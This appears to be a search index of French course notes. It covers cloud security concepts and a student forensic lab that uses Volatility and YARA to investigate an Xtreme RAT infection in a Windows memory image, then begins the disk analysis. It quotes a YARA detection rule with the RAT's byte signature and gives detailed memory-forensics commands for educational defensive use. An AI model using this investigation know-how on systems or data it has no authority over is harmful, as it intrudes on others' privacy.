{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to courses website","title":"Welcome to courses website"},{"location":"#welcome-to-courses-website","text":"","title":"Welcome to courses website"},{"location":"cloud_&_IOT/cloud_computing/","text":"Cloud computing Partage de risque : Contractualisation des responsabilit\u00e9s des parties. => Le client est propri\u00e9taire des donn\u00e9es Le cloud s'engage sur la disponibilit\u00e9 des donn\u00e9es, non a leurs s\u00e9curit\u00e9s, ils ne seront pas responsable du vol de donn\u00e9e. contractuel : On est en droit de n\u00e9gocier : - MAJ logiciel < 24h - PATCH des CVEs sous X jours Cloud priv\u00e9 Inconv\u00e9nients Mission impossible pour une simple PME, il vaut moieux externaliser vers AWS, OHV, JAGUAR network, etc Tr\u00e8s complexe, temps, formations, maintien Necessite une vrai culture de s\u00e9curit\u00e9 Tr\u00e8s tr\u00e8s cher Besoin de faire des exercices sur les incidents. Avantages Contr\u00f4le totale des donn\u00e9es On sait qui intervient sur les donn\u00e9es (changement disques, traitement etc) Cloud public Inconv\u00e9nients Contractuel, bien faire attention \u00e0 ce que l'on signe lors du contrat. R\u00e9cup\u00e9rer les donn\u00e9es ? => \u00e0 stipuler dans le contrat Avantages cloud partag\u00e9 Inconv\u00e9nients Avantages SAAS Superviseurs T1 ESXI Hyper-V, demarre avant l'OS S\u00e9curit\u00e9 physique: Hardening serveur bios chiffrements physique maj firmware hyperviseur / VMs gestion centralis\u00e9e communication LAN chiffr\u00e9es (Serveur -> SAN) D\u00e9marage impossible GRUB Monouser Acc\u00e8s physique Template Mod\u00e8le s\u00e9curis\u00e9 pour un type d'\u00e9quipement -> Connaissance des r\u00e8gles de s\u00e9curit\u00e9s impl\u00e9ment\u00e9es => Savoir les r\u00e8gles de par feu Monitoring Fournisseur collect suffisement de logs pour qualifier et investiguer les incidents Configuration des acc\u00e8s distants Maintien, s\u00e9curisation : etat de l'art du m\u00e9tier par feu Configurer IDS/IPS Garantissent la surveillance active/passive des flux applicatifs => droit de copie des logs vous concernant Honeypot : Pr\u00e9sence + monitoring Vulnerability assessment 1) Le data center est tr\u00e8s claire sur sa politique de security assessment 2) Droit de X jours / ans pour pentest IAM - Identify Access Management Gestion des identit\u00e9s Depot des identit\u00e9s : AD / X500 / LDAP => R\u00f4le ou profils r\u00f4le } templates Gestion des droits (applications multiples) R\u00e8gles d'acc\u00e8s Liste des objets et le profil n\u00e9cessaire pour y acc\u00e9der SSO Le tout entreconnect\u00e9 via SSO F\u00e9d\u00e9ration identit\u00e9 SSO sous st\u00e9ro\u00efde => comme les jeux vid\u00e9os, authentification sur le jeu par google, SSO sur google qui est f\u00e9d\u00e9r\u00e9 \u00e0 l'appli. OAuth https T\u00e9l\u00e9phone OpenID Fork OAuth 2 Pas besoin de password WAF Par feu sp\u00e9cifique : connait le fonctionnement \"normal\" de l'application 1 WAF = 1 application Deep inspection DAM Database Activity Monitoring Surveiller les activit\u00e9s anormales de la BDD => bloquer les transactions => bloquer des selects REST : REpresentationnal State Transfert URL XML JSON SOAP : Simple Object Access Protocol Favoriser entre echange web (https) => SMTP => HTTP => FTP Gestion des erreurs avanc\u00e9e Tr\u00e8s strict dans le format \u00e9change OWASP ? Passer le tout dans la moulinette OWASP => faire tester","title":"Cloud computing"},{"location":"cloud_&_IOT/cloud_computing/#cloud-computing","text":"Partage de risque : Contractualisation des responsabilit\u00e9s des parties. => Le client est propri\u00e9taire des donn\u00e9es Le cloud s'engage sur la disponibilit\u00e9 des donn\u00e9es, non a leurs s\u00e9curit\u00e9s, ils ne seront pas responsable du vol de donn\u00e9e. contractuel : On est en droit de n\u00e9gocier : - MAJ logiciel < 24h - PATCH des CVEs sous X jours","title":"Cloud computing"},{"location":"cloud_&_IOT/cloud_computing/#cloud-prive","text":"","title":"Cloud priv\u00e9"},{"location":"cloud_&_IOT/cloud_computing/#inconvenients","text":"Mission impossible pour une simple PME, il vaut moieux externaliser vers AWS, OHV, JAGUAR network, etc Tr\u00e8s complexe, temps, formations, maintien Necessite une vrai culture de s\u00e9curit\u00e9 Tr\u00e8s tr\u00e8s cher Besoin de faire des exercices sur les incidents.","title":"Inconv\u00e9nients"},{"location":"cloud_&_IOT/cloud_computing/#avantages","text":"Contr\u00f4le totale des donn\u00e9es On sait qui intervient sur les donn\u00e9es (changement disques, traitement etc)","title":"Avantages"},{"location":"cloud_&_IOT/cloud_computing/#cloud-public","text":"","title":"Cloud public"},{"location":"cloud_&_IOT/cloud_computing/#inconvenients_1","text":"Contractuel, bien faire attention \u00e0 ce que l'on signe lors du contrat. R\u00e9cup\u00e9rer les donn\u00e9es ? => \u00e0 stipuler dans le contrat","title":"Inconv\u00e9nients"},{"location":"cloud_&_IOT/cloud_computing/#avantages_1","text":"","title":"Avantages"},{"location":"cloud_&_IOT/cloud_computing/#cloud-partage","text":"","title":"cloud partag\u00e9"},{"location":"cloud_&_IOT/cloud_computing/#inconvenients_2","text":"","title":"Inconv\u00e9nients"},{"location":"cloud_&_IOT/cloud_computing/#avantages_2","text":"","title":"Avantages"},{"location":"cloud_&_IOT/cloud_computing/#saas","text":"","title":"SAAS"},{"location":"cloud_&_IOT/cloud_computing/#superviseurs","text":"","title":"Superviseurs"},{"location":"cloud_&_IOT/cloud_computing/#t1","text":"ESXI Hyper-V, demarre avant l'OS","title":"T1"},{"location":"cloud_&_IOT/cloud_computing/#securite-physique","text":"","title":"S\u00e9curit\u00e9 physique:"},{"location":"cloud_&_IOT/cloud_computing/#hardening-serveur","text":"bios chiffrements physique maj firmware hyperviseur / VMs gestion centralis\u00e9e communication LAN chiffr\u00e9es (Serveur -> SAN) D\u00e9marage impossible GRUB Monouser","title":"Hardening serveur"},{"location":"cloud_&_IOT/cloud_computing/#acces-physique","text":"","title":"Acc\u00e8s physique"},{"location":"cloud_&_IOT/cloud_computing/#template","text":"Mod\u00e8le s\u00e9curis\u00e9 pour un type d'\u00e9quipement -> Connaissance des r\u00e8gles de s\u00e9curit\u00e9s impl\u00e9ment\u00e9es => Savoir les r\u00e8gles de par feu","title":"Template"},{"location":"cloud_&_IOT/cloud_computing/#monitoring","text":"Fournisseur collect suffisement de logs pour qualifier et investiguer les incidents","title":"Monitoring"},{"location":"cloud_&_IOT/cloud_computing/#configuration-des-acces-distants","text":"Maintien, s\u00e9curisation : etat de l'art du m\u00e9tier","title":"Configuration des acc\u00e8s distants"},{"location":"cloud_&_IOT/cloud_computing/#par-feu","text":"Configurer","title":"par feu"},{"location":"cloud_&_IOT/cloud_computing/#idsips","text":"Garantissent la surveillance active/passive des flux applicatifs => droit de copie des logs vous concernant","title":"IDS/IPS"},{"location":"cloud_&_IOT/cloud_computing/#honeypot","text":"Pr\u00e9sence + monitoring","title":"Honeypot :"},{"location":"cloud_&_IOT/cloud_computing/#vulnerability-assessment","text":"1) Le data center est tr\u00e8s claire sur sa politique de security assessment 2) Droit de X jours / ans pour pentest","title":"Vulnerability assessment"},{"location":"cloud_&_IOT/cloud_computing/#iam-identify-access-management","text":"","title":"IAM - Identify Access Management"},{"location":"cloud_&_IOT/cloud_computing/#gestion-des-identites","text":"Depot des identit\u00e9s : AD / X500 / LDAP => R\u00f4le ou profils r\u00f4le } templates","title":"Gestion des identit\u00e9s"},{"location":"cloud_&_IOT/cloud_computing/#gestion-des-droits-applications-multiples","text":"R\u00e8gles d'acc\u00e8s Liste des objets et le profil n\u00e9cessaire pour y acc\u00e9der","title":"Gestion des droits (applications multiples)"},{"location":"cloud_&_IOT/cloud_computing/#sso","text":"Le tout entreconnect\u00e9 via SSO","title":"SSO"},{"location":"cloud_&_IOT/cloud_computing/#federation-identite","text":"SSO sous st\u00e9ro\u00efde => comme les jeux vid\u00e9os, authentification sur le jeu par google, SSO sur google qui est f\u00e9d\u00e9r\u00e9 \u00e0 l'appli.","title":"F\u00e9d\u00e9ration identit\u00e9"},{"location":"cloud_&_IOT/cloud_computing/#oauth","text":"https T\u00e9l\u00e9phone","title":"OAuth"},{"location":"cloud_&_IOT/cloud_computing/#openid","text":"Fork OAuth 2 Pas besoin de password","title":"OpenID"},{"location":"cloud_&_IOT/cloud_computing/#waf","text":"Par feu sp\u00e9cifique : connait le fonctionnement \"normal\" de l'application 1 WAF = 1 application Deep inspection","title":"WAF"},{"location":"cloud_&_IOT/cloud_computing/#dam-database-activity-monitoring","text":"Surveiller les activit\u00e9s anormales de la BDD => bloquer les transactions => bloquer des selects","title":"DAM Database Activity Monitoring"},{"location":"cloud_&_IOT/cloud_computing/#rest-representationnal-state-transfert","text":"URL XML JSON","title":"REST : REpresentationnal State Transfert"},{"location":"cloud_&_IOT/cloud_computing/#soap-simple-object-access-protocol","text":"Favoriser entre echange web (https) => SMTP => HTTP => FTP Gestion des erreurs avanc\u00e9e Tr\u00e8s strict dans le format \u00e9change","title":"SOAP : Simple Object Access Protocol"},{"location":"cloud_&_IOT/cloud_computing/#owasp","text":"Passer le tout dans la moulinette OWASP => faire tester","title":"OWASP ?"},{"location":"forensic/Evidence/","text":"Ressource : https://github.com/Invoke-IR/ForensicPosters https://digital-forensics.sans.org/community/posters 1 Pr\u00e9requis : D\u00e9chiffrer l'image avec GPG : gpg Evidence.vmdk_bak.gpg Ensuite, je rattache le VMDK d\u00e9chiffr\u00e9 \u00e0 la machine sur VMWARE Caine. Je monte le disdque avec Mounted (petit truc vert en bas \u00e0 gauche dans Caine). Je v\u00e9rifie le hash de l'image : sudo md5sum /media/sdb1/Windows/memory.img 04b16c5a3ae70bef40e120fc821bee85 sudo md5sum /media/sdb1/Windows/disk.raw 415689cdfb3928e10a9f3786bb650e05 04b16c5a3ae70bef40e120fc821bee85 memory.img 415689cdfb3928e10a9f3786bb650e05 disk.raw 2 Analyse de la RAM : Je d\u00e9termine l'uimage info de la RAM : /home/student/training/tools/volatility -f /media/sdb1/Windows/memory.img imageinfo Retour de volatility : Volatility Foundation Volatility Framework 2.5 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win10x86, Win8SP0x86, Win81U1x86, Win8SP1x86, Win10x86_44B89EEA AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/media/sdb1/Windows/memory.img) PAE type : PAE DTB : 0x1a8000L KDBG : 0x82461820L Number of Processors : 1 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0x8248b000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2016-08-17 12:00:47 UTC+0000 Image local date and time : 2016-08-17 14:00:47 +0200 ````` Comme on sais que c'est du Windows, on lance la commande pslist : ````bash time /home/student/training/tools/volatility -f /media/sdb1/Windows/memory.img pslist ````` Ca n'a pas march\u00e9 il faut utiliser autre chose : `````bash time /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --profile=Win10x86 pslist # 11 secondes time /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --profile=Win8SP0x86 pslist # 19 secondes time /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --profile=Win10x86_44B89EEA pslist # 7 secondes ````` Avec le dernier profile ca a bien march\u00e9 pas de probl\u00e8me d'encodage des carct\u00e8res comme avec les deux premiers profils. Ensuite, on essaye \u00e0 partir des adresses des pointeurs (DTB,KDBG, KPCR) retourner les processus : `````bash time /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --dtb 0x1a8000 --kdbg 0x82461820 --kpcr 0x8248b000 --profile=Win10x86_44B89EEA pslist # 2 secondes ````` Si on est sur des machines Windowsdans la r\u00e9alit\u00e9, il feut prendre le temps de sp\u00e9cifier les param\u00e8tres **DTB**, **KDBG**, **KPCR** ca va aller beacoup plus vite. Dans notre cas en sp\u00e9cifiant les param\u00e8tres on \u00e0 mis **2 secondes** la ou on met **7 secondes** sans ces param\u00e8tres. Ensuite on l'enregistre dans les variables d'environment pour ne pas avoir a tout retaper : ````bash alias vol=\"sudo /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --profile=Win10x86_44B89EEA --dtb=0x1a8000 --kdbg=0x82461820 --kpcr=0x8248b000\" Ce qui nous permet de tapper vol commande sans avoir \u00e0 tout retaper. vol pslist Retour : Volatility Foundation Volatility Framework 2.5 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x868a7700 System 4 0 104 0 ------ 0 2016-08-16 12:54:24 UTC+0000 0x8d2af5c0 smss.exe 244 4 2 0 ------ 0 2016-08-16 12:54:24 UTC+0000 0x8f7e3040 csrss.exe 324 316 10 0 0 0 2016-08-16 12:54:27 UTC+0000 0x9487c640 smss.exe 388 244 0 -------- 1 0 2016-08-16 12:54:28 UTC+0000 2016-08-16 12:54:28 UTC+0000 0x8b9bf300 wininit.exe 396 316 2 0 0 0 2016-08-16 12:54:28 UTC+0000 0x8f71d2c0 csrss.exe 408 388 11 0 1 0 2016-08-16 12:54:28 UTC+0000 0x94863c40 winlogon.exe 460 388 4 0 1 0 2016-08-16 12:54:28 UTC+0000 0x8b9bc300 services.exe 488 396 6 0 0 0 2016-08-16 12:54:29 UTC+0000 0x948c3040 lsass.exe 516 396 7 0 0 0 2016-08-16 12:54:29 UTC+0000 0x948fb180 svchost.exe 576 488 19 0 0 0 2016-08-16 12:54:30 UTC+0000 0x94954380 svchost.exe 620 488 10 0 0 0 2016-08-16 12:54:30 UTC+0000 0x949bdc40 dwm.exe 716 460 13 0 1 0 2016-08-16 12:54:31 UTC+0000 0x949b08c0 svchost.exe 764 488 16 0 0 0 2016-08-16 12:54:31 UTC+0000 0x9495d6c0 svchost.exe 800 488 46 0 0 0 2016-08-16 12:54:31 UTC+0000 0x949d3040 svchost.exe 848 488 24 0 0 0 2016-08-16 12:54:31 UTC+0000 0x949d3c40 svchost.exe 856 488 10 0 0 0 2016-08-16 12:54:31 UTC+0000 0x949faac0 svchost.exe 896 488 22 0 0 0 2016-08-16 12:54:31 UTC+0000 0x94ca1700 svchost.exe 1068 488 24 0 0 0 2016-08-16 12:54:32 UTC+0000 0x94caf040 svchost.exe 1132 488 24 0 0 0 2016-08-16 12:54:32 UTC+0000 0x9a018040 spoolsv.exe 1212 488 10 0 0 0 2016-08-16 12:54:32 UTC+0000 0x9a039040 svchost.exe 1380 488 12 0 0 0 2016-08-16 12:54:34 UTC+0000 0x9a118380 svchost.exe 1540 488 7 0 0 0 2016-08-16 12:54:34 UTC+0000 0x9a10cb00 wlms.exe 1572 488 4 0 0 0 2016-08-16 12:54:34 UTC+0000 0x9c64f980 sihost.exe 688 800 12 0 1 0 2016-08-16 12:55:35 UTC+0000 0x8c13ea00 taskhostw.exe 268 800 9 0 1 0 2016-08-16 12:55:36 UTC+0000 0x8ad6c040 userinit.exe 1556 460 0 -------- 1 0 2016-08-16 12:55:36 UTC+0000 2016-08-16 12:55:59 UTC+0000 0x8ac4a040 explorer.exe 2068 1556 57 0 1 0 2016-08-16 12:55:36 UTC+0000 0x8ad60940 RuntimeBroker. 2196 576 21 0 1 0 2016-08-16 12:55:37 UTC+0000 0x8ad5f040 SkypeHost.exe 2220 576 10 0 1 0 2016-08-16 12:55:37 UTC+0000 0x8ad22c40 ShellExperienc 2432 576 38 0 1 0 2016-08-16 12:55:39 UTC+0000 0x8b8520c0 SearchIndexer. 2532 488 17 0 0 0 2016-08-16 12:55:40 UTC+0000 0x8b8fb8c0 OneDrive.exe 3592 2068 14 0 1 0 2016-08-16 12:55:57 UTC+0000 0x9c68ec40 fontdrvhost.ex 4428 460 6 0 1 0 2016-08-16 12:57:09 UTC+0000 0x9c728480 svchost.exe 4900 488 3 0 1 0 2016-08-16 12:57:21 UTC+0000 0x8ad86c40 Skype.exe 5128 4696 64 0 1 0 2016-08-16 12:57:42 UTC+0000 0x8c0c9240 TrustedInstall 6108 488 4 0 0 0 2016-08-16 12:58:24 UTC+0000 0x8c0ba9c0 TiWorker.exe 6140 576 5 0 0 0 2016-08-16 12:58:25 UTC+0000 0x9d489780 SystemSettings 2144 576 4 0 1 0 2016-08-16 12:59:36 UTC+0000 0x9499ac40 ApplicationFra 1696 576 5 0 1 0 2016-08-16 12:59:48 UTC+0000 0x9c629300 SystemSettings 5268 5252 4 0 1 0 2016-08-16 12:59:51 UTC+0000 0xb0d47780 svchost.exe 4888 4748 2 0 1 0 2016-08-16 13:02:57 UTC+0000 0x9d5e74c0 explorer.exe 4872 4748 3 0 1 0 2016-08-16 13:02:58 UTC+0000 0x9c7d7c40 svchost.exe 2168 5860 2 0 1 0 2016-08-16 13:03:04 UTC+0000 0xb0c96740 update.exe 5172 5860 6 0 1 0 2016-08-16 13:03:04 UTC+0000 0xd0d9f600 cmd.exe 1976 5172 0 -------- 1 0 2016-08-16 13:04:47 UTC+0000 2016-08-16 13:07:36 UTC+0000 0x9d5ba900 cmd.exe 736 5172 0 -------- 1 0 2016-08-16 13:07:40 UTC+0000 2016-08-16 13:43:12 UTC+0000 0xbac89640 SystemSettings 4968 576 26 0 1 0 2016-08-16 13:41:14 UTC+0000 0xbad4b040 cmd.exe 2748 5172 0 -------- 1 0 2016-08-16 13:50:51 UTC+0000 2016-08-16 14:08:30 UTC+0000 0xbf755c40 cmd.exe 5280 5172 0 -------- 1 0 2016-08-16 14:17:24 UTC+0000 2016-08-16 14:18:48 UTC+0000 0x8b8c44c0 cmd.exe 868 5172 0 -------- 1 0 2016-08-16 14:19:45 UTC+0000 2016-08-16 14:23:02 UTC+0000 0xd53d2c40 cmd.exe 3540 5172 0 -------- 1 0 2016-08-16 14:23:05 UTC+0000 2016-08-16 14:23:46 UTC+0000 0xd5321480 SearchUI.exe 7360 576 26 0 1 0 2016-08-16 18:13:21 UTC+0000 0x9c6a8040 audiodg.exe 18084 848 7 0 0 0 2016-08-17 12:00:20 UTC+0000 0xc8606c40 RamCapture.exe 16740 2068 4 0 1 0 2016-08-17 12:00:36 UTC+0000 0xd53a3500 conhost.exe 16756 16740 2 0 1 0 2016-08-17 12:00:36 UTC+0000 0x9c61a300 SearchProtocol 15756 2532 7 0 ------ 0 2016-08-17 12:00:50 UTC+0000 0xc7fa2a40 SearchFilterHo 14288 2532 5 0 ------ 0 2016-08-17 12:00:50 UTC+0000 0xe2df3040 MusNotificatio 16968 800 1 0 ------ 0 2016-08-18 09:25:38 UTC+0000 0xb0df7040 ?q???q?? 0 0 22...6 -------- ------ 0 Utilisation des YARA rules : cd /home/student/training/ex1/yara-rules vol yarascan -y index.yar > /home/student/yara.text J'all\u00e8ge un peux l'index .yar pour avoir uniquement les CVE, les malware et les Exploits-Kits : cd /home/student/training/ex1/yara-rules find CVE_Rules/ Exploit-Kits/ malware/ -name \"*.yar\" -exec echo include \\\"`pwd`/{}\\\" \\; > test.yar Je relance ma commande avec mon yara all\u00e9g\u00e9 : vol yarascan -y test.yar > /home/student/yara-out.txt Obtenir un r\u00e9sum\u00e9 des r\u00e8gles d\u00e9tecter par YARA rules : grep 'Rule:' yara-out.txt | sort | uniq -c Retour : 15 Rule: SharedStrings 3 Rule: spyeye_plugins 9 Rule: UPX 51 Rule: with_sqlite 18 Rule: Xtreme 9 Rule: xtreme_rat 19 Rule: xtremrat Bon on a des RAT ca c'est inqui\u00e9tant, ce qui peut \u00eatre int\u00e9r\u00e9ssant de voir cart on a 15 share string c'est de voir le contenu de ce qui \u00e0 topper cette cat\u00e9gorie. Retour des sharedStrings : cd /home/student/ grep -Rl 'rule SharedStrings' * cd /home/student/training/ex1/yara-rules Retour : training/ex1/yara-rules/malware/MALW_LURK0.yar Cette YARA rule liste plsuieurs IOC, dans notrze cas on \u00e0 juste les donn\u00e9es E..R , qui ont permis de matcher pour les SharedStrintgs. A chaque fois que l'on match sur une YARA rule il faut regarder plus en profondeur pour d\u00e9terminer si c'est un faux positif. Dans notre casx la c'etait un faux positif. R\u00e9sum\u00e9 : * On a d\u00e9terminer l'image de Windows pr\u00e9cisement par le temps qul profil \u00e9tait le plus rapide est lequel n'afficher pas des ? , * On \u00e0 determiner le DTB , KDBG , KPCR diminuer le temps de traitement des recherche dans la RAM, * On a vu avec les grep les r\u00e8gles qui ont \u00e9t\u00e9 d\u00e9tect\u00e9 par les YARA rules (RAT -> critique), * On a regarder la YARA rule en relation avec Shared Strings, * On a d\u00e9termin\u00e9 que c'est un faux positif pour les shared strings, Exercice analyse avec les autres autres alertes. Avec l'alerte xtreme_rat : grep -Rl 'rule xtreme_rat' * cd /home/student/training/ex1/yara-rules Retour : training/ex1/yara-rules/malware/RAT_Xtreme.yar Identification de la r\u00e8le dans le fichier : cat training/ex1/yara-rules/malware/RAT_Xtreme.yar Voci la YARA rule de d\u00e9tection pour xtreme_rat : rule xtreme_rat : Trojan { meta: author=\"Kevin Falcoz\" date=\"23/02/2013\" description=\"Xtreme RAT\" strings: $signature1={58 00 54 00 52 00 45 00 4D 00 45} /*X.T.R.E.M.E*/ condition: $signature1 } Identification des processus : Process svchost.exe Pid 4888 Process explorer.exe Pid 4872 Process update.exe Pid 5172 Avec l'alerte UPX : grep -Rl 'rule UPX' * cd /home/student/training/ex1/yara-rules Retour : training/ex1/yara-rules/malware/RAT_Ratdecoders.yar Identification des process : grep -i -A 1 'UPX' /home/student/yara-out.txt | grep Owner | uniq -c Retour : 3 Owner: Process svchost.exe Pid 4888 3 Owner: Process explorer.exe Pid 4872 3 Owner: Process update.exe Pid 5172 Avec l'alerte xtremrat : grep -Rl 'rule xtremrat' * cd /home/student/training/ex1/yara-rules Retour : training/ex1/yara-rules/malware/RAT_Xtreme.yar Identification des process : grep -i -A 1 'xtremrat' /home/student/yara-out.txt | grep Owner | uniq -c Retour : 11 Owner: Process explorer.exe Pid 4872 8 Owner: Process update.exe Pid 5172 On a trouv\u00e9 beaucoup d'occupances pour * SQLite - non explor\u00e9 \u00e0 ce jour * Shared Strings, probablement faux positif (STRINg E.R trop g\u00e9nrique) * SpyEye, probablement un faux positif vu les chaines recherch\u00e9es * Un packet d\u00e9tect\u00e9 (UPX) * probable rat xtrem_rat On se concentre sur les processus infect\u00e9s par le packer et le xtrem_rat PID 4888 (svchost) PID 4872 explorer PID 5172 update SQLITE difficiele de dire si c'est des vrais postifis ou pas. Refaire la timeline de l'atatque. R\u00e9sum\u00e9 : : J'ai v\u00e9rifi\u00e9 le MD5 du dump disk et lm\u00e9moire (ok) Mettre les valeurs des hash On a trouv\u00e9 l'empreinte de l'os avec le plugin imageinfo Win10_ ???? On a trouv\u00e9 DTB KPCR et cpi citer les adresses m\u00e9moire Nous avons appliqu\u00e9 les yara rules sur le dump m\u00e9moire, en nous concentrant sur: CVE, malware, packers On a trouv\u00e9 beaucoup d'occupances pour SQLite - non explor\u00e9 \u00e0 ce jour Shared Strings, probablement faux positif (STRINg E.R trop g\u00e9nrique) SpyEye, probablement un faux positif vu les chaines recherch\u00e9es Un packet d\u00e9tect\u00e9 (UPX) probable rat xtrem_rat On se concentre sur les processus infect\u00e9s par le packer et le xtrem_rat PID 4888 (svchost) PID 4872 explorer PID 5172 update 2.1 Retracer la timeline de l'attaque : Observer le sprocessus : vol pslist Un ligne est int\u00e9r\u00e9ssante : 0x868a7700 System 4 0 104 0 ------ 0 2016-08-16 12:54:24 UTC+0000 ````` Le processus **System** est le premier processus qui d\u00e9marre lors du d\u00e9marrage du syst\u00e8me. Donc le syst\u00e8me \u00e0 boot le 16 Aout 2016 \u00e0 12:54:24. Ensuite, les serices applicatifs d\u00e9marre chacun leurs tour. Voci les processus que l'on suspecte : * svchost.exe, * explorer.exe, * update.exe, * 6 processus cmd.exe, On peux remarquer que le PPID des processus **cmd.exe** est identique entre tous les process, le PPID **5172** qui correspond au processus **update.exe**. Donc : * BOOT PC, System : 2016-08-16 12:54:24 UTC+0000 * UPDATE.EXE : 2016-08-16 13:03:04 UTC+0000 Nosu pouvons observer que le processus UOPDATE.EXE lance un processus CMD.EXE toutes les 3 minutes, c'est louche... Ce qui est int\u00e9r\u00e9ssant d'observer c'est comment les processus ont \u00e9t\u00e9 lanc\u00e9 : * Pour svchost.exe ````bash vol dlllist -p 4888 | grep 'Command line' Retour : Command line : svchost.exe Il \u00e0 \u00e9t\u00e9 lanc\u00e9 par la CLI. Pour update.exe : vol dlllist -p 5172 | grep 'Command line' Retour : Command line : C:\\Users\\Peter\\AppData\\Roaming\\HostData\\update.exe Il \u00e0 \u00e9t\u00e9 lanc\u00e9 par la CLI. Bizzard update.exe se trouve dans uh r\u00e9pertoire ou il ne doit pas \u00eatre normalement... Pour explorer.exe : vol dlllist -p 4872| grep 'Command line' Retour : Command line : explorer.exe Il \u00e0 \u00e9t\u00e9 lanc\u00e9 par la CLI. 2.2 Analyse des processus : 2.2.1 EXPLORER.EXE : Pour explorer.exe : vol pslist | egrep '(Name|explorer.exe)' Retour : explorer.exe 2068 explorer.exe 4872 Bizzard deux processus explorer.exe alors que normalement il n'y en a q'un ! Le PPID de 2068 est 1156 : vol pslist | grep 1556 Retour : userinit.exe 1556 C'est un peu plus coh\u00e9rant... On a possiblement identifi\u00e9 : * Un processus explorer.exe, sain PID:2068 * Un processus explorer.exe, v\u00e9rol\u00e9 PID:4872 Tr\u00e8s probablement il y a un mecanisme qui permet de cr\u00e9er deux process explorer.exe. 2.2.1 UPDATE.EXE : On a qu'un procesuss UDATE.EXE -> OK 2.3 Analyse r\u00e9seau : vol netscan Lorsque le PID == -1 c'est que volatility n'arrive pas a retrouver el PID du processus... On peux noter l'utilisation de ports de destination \u00e9trange 12345 alors que la connexion est en \u00e9tat ESTABLISHED et a chaque fois on a pas l'@ IP de destination... Recherche sp\u00e9cifique sur le port de destination 12345 , a noter le port de destination 33033 est \u00e9trange... : vol netscan | egrep '(State|:12345|:33033)' Retour : 192.168.5.100:59220 -:12345 ESTABLISHED -1 192.168.5.100:59271 -:12345 ESTABLISHED -1 192.168.5.100:59268 -:33033 CLOSED -1 Ok, on a vu des ports de destination 80 et 443 ... analyse de ces connexions : vol netscan | egrep '(State|:80|:443)' Retour : Offset(P) Proto Local Address Foreign Address State Pid 0x85b63230 TCPv4 192.168.5.100:59280 -:443 ESTABLISHED -1 0x86963230 TCPv4 192.168.5.100:59280 -:443 ESTABLISHED -1 0x8ad0bc30 TCPv4 192.168.5.100:59277 0.0.0.29:80 ESTABLISHED -1 0x9a1e2c00 TCPv4 192.168.5.100:49864 -:443 ESTABLISHED -1 0x9d5677b0 TCPv4 192.168.5.100:58959 0.0.0.0:443 ESTABLISHED -1 0xc6a21308 TCPv4 192.168.5.100:59250 -:443 ESTABLISHED -1 0xc7278c70 TCPv4 192.168.5.100:59265 -:443 ESTABLISHED -1 0xc7e81618 TCPv4 192.168.5.100:59246 -:443 ESTABLISHED -1 0xc7eeadf0 TCPv4 192.168.5.100:59234 -:443 ESTABLISHED -1 0xc7f9e760 TCPv4 192.168.5.100:59283 -:443 ESTABLISHED -1 0xd0d33008 TCPv4 192.168.5.100:59269 -:443 ESTABLISHED -1 0xe2d145c8 TCPv4 192.168.5.100:59274 -:443 CLOSED -1 Humm, \u00e0 chaque fois on a aucune IP de destination... Constat, \u00e0 chaque observation que l'on r\u00e9alise on n'arrive pas \u00e0 obtenir l'@IP de destination, ce qui est \u00e9trange surtout pour des connexions ESTABLISHED . G\u00e9n\u00e9ralement dans un CSIRT toutes les connexions sont trac\u00e9s avec diff\u00e9rentes statistiques (dur\u00e9es, taille des \u00e9changes, etc.). G\u00e9n\u00e9ralement les technologies derri\u00e8res sont : * SPLUNK Les donn\u00e9es des SWITCHS transitent avec NETFLOW, quipermet de logguer les connexions (ICMP,IP,TCP,UDP,etc.). dans notre cas, la seule chance possible de retrouver l'@ IP de destination c'est avec SPLUNK et NETFLOW. Pour r\u00e9sumer, je sais qu'un RAT \u00e0 \u00e9t\u00e9 d\u00e9ploy\u00e9 et que quelquechose de louche est pr\u00e9sente dans le r\u00e9pertoire Appdata gr\u00e2ce aux horodatage des processus.. Recherche avec malfind : vol malfind | grep Process Retour : Process: explorer.exe Pid: 2068 Address: 0x6660000 Process: explorer.exe Pid: 2068 Address: 0x72d0000 Process: Skype.exe Pid: 5128 Address: 0x1f0000 Process: explorer.exe Pid: 4872 Address: 0xc80000 Process: update.exe Pid: 5172 Address: 0x400000 Process: SearchUI.exe Pid: 7360 Address: 0xa7d0000 Process: SearchUI.exe Pid: 7360 Address: 0xc730000 Hum ca confirme nos hypoth\u00e8ses... Recherche des mutants, les mutants sont des handle qui change de structure et cela peut \u00eatre un IoC : vol mutantscan On retrouve skype, ce virus ne semble pas de passer par des mutex Pour conclure, on a une id\u00e9e assez pr\u00e9cise ou chercher, par le dump du disque, nous pourrons analyser plus en profondeur. 3 Analyse du disque : 3.1 Pr\u00e9requis : Analyse des partition dump du DD : mmls disk.raw Retour : Slot Start End Length Description 000: Meta 0000000000 0000000000 0000000001 Primary Table (#0) 001: ------- 0000000000 0000002047 0000002048 Unallocated 002: 000:000 0000002048 0001026047 0001024000 NTFS / exFAT (0x07) 003: 000:001 0001026048 0050329599 0049303552 NTFS / exFAT (0x07) 004: ------- 0050329600 0050331647 0000002048 Unallocated Deux partition NTFS, g\u00e9n\u00e9ralement la partition C: est la plus grande, je suppose donc que la partion C: est la n\u00b03. Pour monter la partiton, il faut pr\u00e9ciser \u00e0 partir de quel octet l'on souhaite commencer. La valeur Start dans le retour de mmls, correspond au num\u00e9ros de bloc, par d\u00e9faut dans Windows, les blocs sont de 512 Octets. Donc : 0001026048 * 512 = 525336576 Puis, monter la partition en RO mkdir /mnt/partitionC mount -t ntfs -o ro,offset=525336576 disk.raw /mnt/partitionC/ V\u00e9rification : ls /mnt/partitionC/ Retour : autoexec.bat BOOTNXT pagefile.sys ProgramData Recovery swapfile.sys Users bootmgr config.sys PerfLogs Program Files $Recycle.Bin System Volume 